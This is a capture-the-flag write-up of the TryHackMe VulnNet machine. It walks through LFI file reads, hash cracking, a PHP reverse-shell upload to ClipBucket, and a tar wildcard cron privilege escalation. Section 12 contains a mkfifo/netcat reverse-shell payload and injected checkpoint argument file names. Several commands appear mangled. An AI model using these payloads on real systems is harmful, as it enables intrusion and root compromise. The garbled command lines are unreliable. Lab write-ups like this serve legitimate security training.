# VulnNet — From LFI to Wildcard Cron Privilege Escalation

> **TryHackMe — VulnNet Series Part 1**
> **Difficulty:** Medium
> **Target:** `10.48.114.230`
> **Hostname:** `vulnnet.thm`

---

## 01 — Overview

VulnNet is a Linux-based medium-difficulty machine from the TryHackMe VulnNet series.

The initial enumeration revealed SSH, DNS, SMB, and an HTTPS service running Amazon DCV. Further web enumeration uncovered a **Local File Inclusion (LFI)** vulnerability, which allowed access to sensitive files including an Apache `.htpasswd` file.

After cracking the discovered credentials, access was gained to a **ClipBucket** instance on `broadcast.vulnnet.thm`. An unrestricted PHP file upload provided the initial foothold as `www-data`.

From there, an SSH backup archive exposed a private key protected by a crackable passphrase. This allowed access as the `server-management` user.

Finally, enumeration of the system cron configuration revealed a root cron job executing a backup script. The script was vulnerable to a **wildcard-based privilege escalation**, leading to root access.

---

# 02 — Recon: Finding the Open Doors

## Full Port Scan

The enumeration started with an all-port TCP scan:

```bash
nmap 10.48.114.230 -p-
```

Relevant open ports:

| Port | Service            |
| ---: | ------------------ |
|   22 | SSH                |
|   53 | DNS                |
|  139 | NetBIOS            |
|  445 | SMB                |
| 8443 | HTTPS / Amazon DCV |

Ports `7777` and `7778` were reported as filtered.

---

## Service and Version Enumeration

A service/version scan identified the following:

```text
22/tcp   open  ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
53/tcp   open  domain       dnsmasq 2.90
139/tcp  open  netbios-ssn  Samba smbd 4.6.2
445/tcp  open  netbios-ssn  Samba smbd 4.6.2
8443/tcp open  ssl/https    Amazon DCV
```

The HTTPS service on port `8443` identified itself as **Amazon DCV**. SMB signing was enabled but not required.
The machine also required the following `/etc/hosts` entry:

```text
10.48.114.230 vulnnet.thm
```

---

# 03 — SMB Enumeration: Nothing Easy Yet

Anonymous SMB enumeration was attempted:

```bash
smbclient -L 10.48.114.230 -N
```

The available shares were:

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service
```

SMB1 was disabled, and there was no immediately useful anonymous share discovered.

With SMB providing little useful information, attention moved toward the web services.

---

# 04 — Web Enumeration: Digging Beneath the Surface

Directory enumeration was performed against the web application.

```text
/js
/css
/img
/fonts
/server-status
```

The discovered directories did not immediately provide an obvious entry point.

Virtual-host fuzzing also did not initially provide much useful information.

The deeper parameter fuzzing, however, revealed something much more interesting: a **Local File Inclusion vulnerability**.

---

# 05 — LFI: Reading Files Through `referer`

The vulnerable parameter was identified as:

```text
referer
```

Testing it against `/etc/passwd`:

```bash
curl http://vulnnet.thm/index.php?referer=/etc/passwd
```

returned local system information, including the `server-management` account:

```text
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
```

This confirmed that arbitrary local files could be read through the vulnerable parameter.

---

## Apache `.htpasswd` Discovery

The same LFI was used to retrieve the Apache password file:

```bash
curl http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswdetc/apache2/.htpasswd
```

The response exposed a password hash belonging to the `developers` account:

```text
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

The hash was saved locally and attacked using John the Ripper:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The recovered credential was:

```text
Username: developers
Password: 9972761drmfsls
```

---

# 06 — The Hidden Host: `broadcast.vulnnet.thm`

During web enumeration, JavaScript files revealed another subdomain and the previously discovered `referer` parameter.

The new host was:

```text
broadcast.vulnnet.thm
```

Visiting the broadcast host exposed a **ClipBucket dashboard**, providing a new attack surface.

---

# 07 — Initial Foothold: Weaponizing the File Upload

The discovered `developers` credentials were used to authenticate to the ClipBucket upload functionality.

A PHP reverse-shell file was uploaded using:

```bash
curl -F "file=@rev.php" \
     -F "plupload=1" \
     -F "name=anyname.php" \
     "http://broadcast.vulnnet.thm/actions/photo_uploader.php" \
     -u developers:9972761drmfsls
```

The server responded:

```json
{
  "success": "yes",
  "file_name": "1789130130288cae",
  "extension": "php",
  "file_directory": "2026/09/11"
}
```

This confirmed that the PHP file had been successfully uploaded.

A Netcat listener was started:

```bash
nc -lvnp 4444
```

The reverse shell connected back successfully:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The initial shell was therefore obtained as:

```text
www-data
```

---

# 08 — Stabilizing the Shell

Python 3 was available:

```bash
which python3
```

```text
/usr/bin/python3
```

A pseudo-terminal was spawned:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After suspending the listener and configuring the local terminal:

```bash
stty raw -echo
fg
```

the shell was stabilized with:

```bash
export TERM=xterm
```

---

# 09 — SSH Backup: Finding the Next Credential

While enumerating the filesystem, a backup archive was discovered:

```bash
ls -lah ssh-backup.tar.gz
```

Output:

```text
-rw-rw-r-- 1 server-management server-management 1.5K Jan 24  2021 ssh-backup.tar.gz
```

The archive was transferred locally and decompressed:

```bash
gunzip ssh-backup.tar.gz
```

Then extracted:

```bash
tar -xvf ssh-backup.tar
```

The archive contained:

```text
id_rsa
```

---

# 10 — Cracking the SSH Key Passphrase

The private key required a passphrase.

John the Ripper was used to crack the associated hash:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The recovered passphrase was:

```text
oneTWO3gOyac
```

The recovered SSH key and passphrase provided the path toward access as the `server-management` user.

The user's home directory contained:

```text
Desktop
Downloads
Pictures
Templates
Videos
Documents
Music
Public
user.txt
```

The user flag was therefore available from the user's home directory.

---

# 11 — Privilege Escalation: Hunting Root's Automation

With user access established, privilege escalation enumeration began.

The system-wide cron configuration was inspected:

```bash
cat /etc/crontab
```

The important entry was:

```text
*/2   * * * *   root    /var/opt/backupsrv.sh
```

This showed that:

> **`/var/opt/backupsrv.sh` is executed by root every two minutes.**

The backup script was therefore the next major privilege-escalation target.

---

# 12 — Wildcard Injection: Turning the Backup Job Against Root

The backup script contained a wildcard-based operation.

The notes identify this as a **wildcard privilege escalation** technique.

The payload used was:

```bash
echo “mkfifo /tmp/obz; nc 192.168.148.234 4445 0/tmp/obz 2>&1; rm /tmp/obz” > shell.sh

echo “” > “ — checkpoint-action=exec=sh shell.sh”

echo “” > — checkpoint=1
```

The crafted arguments caused the backup process to execute the attacker-controlled shell script.

This resulted in command execution within the context of the root cron job.

---

# 13 — Root Access

Because `/var/opt/backupsrv.sh` was executed by `root`, abusing its wildcard operation resulted in execution with root privileges.

The resulting access allowed the root flag to be read from the target.

```text
root.txt
```

The supplied notes confirm that this was the final privilege-escalation stage, although the actual root flag value was not included in the notes.

---

# 14 — Attack Path Summary

```text
Open Ports
    │
    ├── SSH
    ├── SMB
    └── Web
         │
         ▼
   Web Enumeration
         │
         ▼
   LFI via referer
         │
         ▼
   Read Apache .htpasswd
         │
         ▼
   Crack developers hash
         │
         ▼
developers : 9972761drmfsls
         │
         ▼
broadcast.vulnnet.thm
         │
         ▼
   ClipBucket Dashboard
         │
         ▼
   PHP File Upload
         │
         ▼
    Reverse Shell
         │
         ▼
       www-data
         │
         ▼
   ssh-backup.tar.gz
         │
         ▼
       id_rsa
         │
         ▼
 Crack SSH passphrase
         │
         ▼
     server-management
         │
         ▼
     /etc/crontab
         │
         ▼
 /var/opt/backupsrv.sh
         │
         ▼
 Wildcard Privilege Escalation
         │
         ▼
        root
```

---

# 15 — Key Takeaways

### Web Enumeration

* Directory enumeration alone did not immediately reveal the attack path.
* Parameter fuzzing was important in identifying the vulnerable `referer` parameter.
* JavaScript files contained useful information about the application's functionality and additional hostname.

### Local File Inclusion

* The `referer` parameter allowed local files to be read.
* Sensitive configuration files such as `.htpasswd` can expose credentials or password hashes.

### Credential Reuse and Discovery

* The `developers` hash was cracked with `rockyou.txt`.
* The resulting credentials provided access to another web application.
* An SSH backup archive later exposed a private key and its crackable passphrase.

### File Upload

* The ClipBucket upload functionality accepted a PHP file.
* This resulted in the initial reverse shell as `www-data`.

### Linux Privilege Escalation

* System-wide cron jobs should always be inspected after obtaining local access.
* A root-owned scheduled script using wildcard expansion can become a powerful privilege-escalation vector.

---

# 16 — Tools Used

| Tool            | Purpose                      |
| --------------- | ---------------------------- |
| Nmap            | Port and service enumeration |
| smbclient       | SMB share enumeration        |
| Gobuster        | Web directory enumeration    |
| cURL            | LFI testing and file upload  |
| John the Ripper | Password/hash cracking       |
| Netcat          | Reverse shell listener       |
| Python3         | Shell stabilization          |
| tar/gunzip      | Backup archive extraction    |
| SSH             | Remote user access           |

---

# 17 — Conclusion

VulnNet demonstrates how several individually interesting weaknesses can be chained into complete system compromise.

The attack began with network and web enumeration, leading to an **LFI vulnerability**. The LFI exposed an Apache password hash, which was cracked to obtain the `developers` credentials.

Those credentials opened the door to the `broadcast.vulnnet.thm` ClipBucket instance, where a PHP upload resulted in a reverse shell as `www-data`.

Further local enumeration uncovered an SSH backup containing a private key. After cracking its passphrase, user-level access was obtained.

The final escalation came from a root cron job executing a vulnerable backup script. Abusing its wildcard handling ultimately resulted in **root command execution**.

The machine highlights the importance of chaining seemingly small weaknesses together: **information disclosure → credential compromise → file upload → shell access → sensitive backup → cron misconfiguration → root**.
